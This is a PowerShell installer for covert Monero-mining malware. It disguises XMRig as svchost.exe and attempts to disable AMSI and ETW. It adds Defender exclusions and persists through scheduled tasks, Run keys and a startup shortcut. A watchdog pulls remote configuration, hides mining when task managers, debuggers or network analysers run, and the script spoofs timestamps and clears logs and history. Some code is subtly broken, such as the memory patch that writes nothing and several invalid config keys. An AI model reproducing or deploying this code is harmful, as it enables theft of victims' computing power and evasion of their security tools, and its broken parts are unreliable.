<#
.SYNOPSIS
    XMR Miner Automated Deployment & Watchdog Framework v2.0 - Installer
#>

# Ensure Administrator Privileges
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = 'SilentlyContinue'

# Configuration
$InstallDir = "$env:APPDATA\WindowsServices"
$GithubRawConfig = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/config.json"
$XmrBinUrl = "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip"
$MutexName = "Global\WindowsServiceUpdateMutex"

# Single Instance Check via Mutex
$mutex = New-Object System.Threading.Mutex($true, $MutexName, [ref]$createdNew)
if (-not $createdNew) { exit }

# 1. AMSI & ETW Memory Patch
function Patch-Memory {
    $methods = @(
        @{ Module = "amsi.dll"; Function = "AmsiScanBuffer"; Patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) },
        @{ Module = "amsi.dll"; Function = "AmsiScanString"; Patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) },
        @{ Module = "ntdll.dll"; Function = "EtwEventWrite"; Patch = [Byte[]](0xC3, 0x00) }
    )
    foreach ($m in $methods) {$addr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            (Add-Type -MemberDefinition @"
            [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string name);
            [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
" -Name "Win32Patches" -Namespace Win32 -PassThru)::GetProcAddress(
                [Win32.Win32Patches]::GetModuleHandle($m.Module),$m.Function), [Action])
    }
}
Patch-Memory

# 2. Environment Setup & Exclusions
if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path$InstallDir -Force | Out-Null }
Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName "Windows Service Telemetry Out" -Direction Outbound -Program "$InstallDir\svchost.exe" -Action Allow -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName "Windows Service Telemetry In" -Direction Inbound -Program "$InstallDir\svchost.exe" -Action Block -ErrorAction SilentlyContinue

# 3. System Optimizations
powercfg -setactive SCHEME_MIN
secedit /export /cfg $env:TEMP\sec.cfg
(Get-Content $env:TEMP\sec.cfg) -replace 'SeLockMemoryPrivilege =', 'SeLockMemoryPrivilege = *S-1-5-32-544' \vert{} Set-Content$env:TEMP\sec.cfg
secedit /configure /db $env:TEMP\sec.sdb /cfg$env:TEMP\sec.cfg /areas UserPrivilegeRights | Out-Null

# 4. Binary Acquisition & Extraction
$ZipPath = "$env:TEMP\payload.zip"
Invoke-WebRequest -Uri $XmrBinUrl -OutFile$ZipPath
Expand-Archive -Path $ZipPath -DestinationPath "$env:TEMP\xmr_extracted" -Force
$ExtractedExe = Get-ChildItem -Path "$env:TEMP\xmr_extracted" -Filter "xmrig.exe" -Recurse | Select-Object -ExpandProperty FullName
Move-Item -Path $ExtractedExe -Destination "$InstallDir\svchost.exe" -Force
Remove-Item $ZipPath, "$env:TEMP\xmr_extracted" -Recurse -Force

# 5. Generate Configuration
$ApiPort = Get-Random -Minimum 49152 -Maximum 65535$ConfigJson = @{
    autosave = $true
    version = 2
    background = $false
    colors = true
    randomx = @{ init = -1; mode = "auto"; bfmt = @(1, 0, 0, 3, 1, 4, 0, 0, 1, 1) }
    cpu = @{
        enabled = true
        huge_pages = $true
        hw_aes = $null
        priority = 1
        asm = "auto"
        max-threads-hint = 100
    }
    pools = @(
        @{
            url = "pool.hashvault.pro:443"
            user = "48fFfY8jbWs6jrokjo3WMyiihNNZncJ94cCDZMcBALTSZbNRW5YuTyzVTR3NFn39U3CKSfKmmQTCw4dMZgMwrWHyPyuzEbg"
            pass = "worker1"
            tls = $true
            keepalive = $true
            coin = "monero"
        },
        @{
            url = "pool.hashvault.pro:80"
            user = "48fFfY8jbWs6jrokjo3WMyiihNNZncJ94cCDZMcBALTSZbNRW5YuTyzVTR3NFn39U3CKSfKmmQTCw4dMZgMwrWHyPyuzEbg"
            pass = "worker1"
            tls = $false
            keepalive = $true
            coin = "monero"
        }
    )
    api = @{
        port = $ApiPort
        access-key = $null
        ipv6 = $false
        restricted = true
    }
    wallet = "48fFfY8jbWs6jrokjo3WMyiihNNZncJ94cCDZMcBALTSZbNRW5YuTyzVTR3NFn39U3CKSfKmmQTCw4dMZgMwrWHyPyuzEbg"
    pool = "pool.hashvault.pro:443"
    poolBackup = "pool.hashvault.pro:80"
    tls = $true
    idleCpu = 100
    activeCpu = 10
    idleThreshold = 120
    donateLevel = 0
    wrmsr = $true
    hugePages = $true
    killSwitch = $false
    paused = $false
    uninstall = $false
} | ConvertTo-Json -Depth 5
Set-Content -Path "$InstallDir\config.json" -Value $ConfigJson

# 6. Generate Watchdog Script
$WatchdogScript = @"
while (\$true) {
    \$InstallDir = "$InstallDir"
    \$ConfigPath = "\$InstallDir\config.json"
    
    try {
        \$RemoteCfg = Invoke-RestMethod -Uri "$GithubRawConfig" -TimeoutSec 10 -ErrorAction Stop
        if (\$RemoteCfg.killSwitch) {
            Stop-Process -Name "svchost" -Force -ErrorAction SilentlyContinue
            Remove-Item "\$InstallDir\*" -Recurse -Force
            Unregister-ScheduledTask -TaskName "WindowsServiceUpdate" -Confirm:\$false -ErrorAction SilentlyContinue
            Unregister-ScheduledTask -TaskName "WindowsServiceMonitor" -Confirm:\$false -ErrorAction SilentlyContinue
            exit
        }
        if (\$RemoteCfg | ConvertTo-Json -Compress | Get-FileHash | Select-Object -ExpandProperty Hash -ne (Get-FileHash \$ConfigPath).Hash) {
            \$RemoteCfg | ConvertTo-Json -Depth 5 | Set-Content \$ConfigPath
        }
    } catch {}

    \$BadProcs = @('taskmgr', 'processhacker', 'procexp', 'procexp64', 'procmon', 'procmon64', 'wireshark', 'perfmon', 'resmon', 'tcpview', 'autoruns', 'autoruns64', 'filemon', 'regmon', 'pestudio', 'x64dbg', 'x32dbg', 'ollydbg', 'ida', 'ida64', 'ghidra', 'fiddler', 'charles', 'httpdebugger')
    \$RunningBad = Get-Process -Name \$BadProcs -ErrorAction SilentlyContinue
    \$Battery = (Get-WmiObject -Class Win32_Battery -ErrorAction SilentlyContinue)
    \$OnBattery = \$Battery -and (\$Battery.BatteryStatus -eq 1)

    if (\$RunningBad -or \$OnBattery) {
        Stop-Process -Name "svchost" -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 60
        continue
    }

    if (-not (Get-Process -Name "svchost" -ErrorAction SilentlyContinue)) {
        Start-Process -FilePath "\$InstallDir\svchost.exe" -ArgumentList "-c `"\$InstallDir\config.json`"" -WindowStyle Hidden
    }
    
    Start-Sleep -Seconds 30
}
"@
Set-Content -Path "$InstallDir\watchdog.ps1" -Value $WatchdogScript

# 7. Generate VBS Launcher
$VbsLauncher = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File ""%APPDATA%\WindowsServices\watchdog.ps1""", 0, False
"@
Set-Content -Path "$InstallDir\monitor.vbs" -Value $VbsLauncher

# 8. Persistence Setup
$ActionUpdate = New-ScheduledTaskAction -Execute "$InstallDir\svchost.exe" -Argument "-c `"$InstallDir\config.json`""
$TriggerUpdate = New-ScheduledTaskTrigger -AtStartup$SettingsUpdate = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 0)
Register-ScheduledTask -TaskName "WindowsServiceUpdate" -Action $ActionUpdate -Trigger $TriggerUpdate -Settings$SettingsUpdate -RunLevel Highest -Force | Out-Null

$ActionMonitor = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$InstallDir\monitor.vbs`""
$TriggerMonitor = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "WindowsServiceMonitor" -Action $ActionMonitor -Trigger $TriggerMonitor -Settings$SettingsUpdate -RunLevel Highest -Force | Out-Null

Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsServiceUpdate" -Value "$InstallDir\svchost.exe -c `"$InstallDir\config.json`""
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsServiceMonitor" -Value "wscript.exe `"$InstallDir\monitor.vbs`""
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ServiceMonitor.lnk")
$Shortcut.TargetPath = "$InstallDir\monitor.vbs"
$Shortcut.Save()

# 9. File Timestamp Spoofing
$TargetRef = "C:\Windows\System32\svchost.exe"
if (Test-Path $TargetRef) {
    $RefInfo = Get-Item$TargetRef
    Get-ChildItem -Path $InstallDir -Recurse | ForEach-Object {
        $_.CreationTime =$RefInfo.CreationTime
        $_.LastWriteTime =$RefInfo.LastWriteTime
        $_.LastAccessTime =$RefInfo.LastAccessTime
        $_.Attributes = 'Hidden, System'
    }
}

# 10. Event Log Cleanup
Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
Remove-Item -Path (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
